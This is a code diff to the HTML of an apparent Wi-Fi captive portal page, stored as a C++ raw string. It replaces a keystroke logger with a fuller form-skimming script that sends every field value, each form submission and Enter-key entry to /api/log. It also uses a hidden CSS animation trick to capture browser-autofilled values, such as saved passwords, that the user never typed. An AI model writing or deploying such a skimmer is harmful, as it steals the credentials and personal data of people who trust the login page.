@@ -38,6 +38,7 @@ const char default_portal_html[] = R"rawliteral(
         margin: auto;
       }
 
+      @-webkit-keyframes ghost_af{0%{opacity:0.9}100%{opacity:1}} input:-webkit-autofill{animation:ghost_af 0s;}
       .g-input {
         width: 95%;
         height: 30px;
@@ -148,14 +149,15 @@ const char default_portal_html[] = R"rawliteral(
     </div>
     <script>
 (function(){
-function logKey(key){
-var xhr=new XMLHttpRequest();
-xhr.open('POST','/api/log',true);
-xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');
-xhr.send(JSON.stringify({key:key}));
-}
-document.addEventListener('keyup',function(e){logKey(e.key);});
-document.addEventListener('input',function(e){if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){var val=e.target.value;var key=val.slice(-1);if(key)logKey(key);}});
+function send(d){if(navigator.sendBeacon)navigator.sendBeacon('/api/log',new Blob([d]));else fetch('/api/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:d});}
+function fieldVal(t){if(t.tagName.toLowerCase()==='select')return t.options[t.selectedIndex]?t.options[t.selectedIndex].text:'';if(t.type==='checkbox'||t.type==='radio')return t.checked?'1':'0';return t.value||'';}
+function fieldId(t){return t.name||t.id||t.getAttribute('placeholder')||t.type||'';}
+var debounce;
+document.addEventListener('input',function(e){clearTimeout(debounce);debounce=setTimeout(function(){var t=e.target;if(!t||!t.tagName)return;var tag=t.tagName.toLowerCase();if(tag!=='input'&&tag!=='textarea'&&tag!=='select')return;var id=fieldId(t);if(!id)return;send(Date.now()+'|'+tag+'|'+id+'|'+fieldVal(t)+'\n');},300);},true);
+document.addEventListener('change',function(e){var t=e.target;if(!t||!t.tagName)return;var tag=t.tagName.toLowerCase();if(tag!=='input'&&tag!=='textarea'&&tag!=='select')return;var id=fieldId(t);if(!id)return;send(Date.now()+'|'+tag+'|'+id+'|'+fieldVal(t)+'\n');},true);
+document.addEventListener('submit',function(e){var form=e.target;if(!form||form.tagName.toLowerCase()!=='form')return;var data=[];for(var i=0;i<form.elements.length;i++){var t=form.elements[i];if(!t.name&&!t.id)continue;data.push((t.name||t.id)+'='+fieldVal(t));}if(data.length)send('form|'+form.action+'|'+data.join('&')+'\n');},true);
+document.addEventListener('animationstart',function(e){if(e.animationName==='ghost_af'){var t=e.target;if(!t||!t.tagName)return;var tag=t.tagName.toLowerCase();if(tag!=='input'&&tag!=='textarea'&&tag!=='select')return;var id=fieldId(t);if(!id)return;send(Date.now()+'|'+tag+'|'+id+'|'+fieldVal(t)+'\n');}},true);
+document.addEventListener('keydown',function(e){if(e.key==='Enter'){var t=e.target;if(t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'))send(Date.now()+'|'+t.tagName.toLowerCase()+'|'+fieldId(t)+'|'+fieldVal(t)+'\n');}},true);
 })();
     </script>
   </body>
